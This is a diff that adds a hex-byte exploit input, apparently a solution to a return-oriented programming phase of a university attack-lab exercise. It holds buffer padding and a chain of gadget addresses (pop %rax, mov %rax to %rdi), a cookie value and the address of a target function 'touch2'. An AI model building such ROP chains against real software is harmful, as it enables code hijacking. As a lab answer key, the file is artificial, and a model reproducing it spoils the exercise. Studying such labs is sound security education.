@@ -1,0 +1,10 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* Jump to 0x4019ab, the code is #popq %rax; #nop; #ret */
+fa 97 b9 59 00 00 00 00 /* Cookie */
+a2 19 40 00 00 00 00 00 /* Jump to 0x4019a2, the code is #movq %rax; %rdi; #ret */
+ec 17 40 00 00 00 00 00 /* Jump to 0x4017ec, address of function touch2 */
+
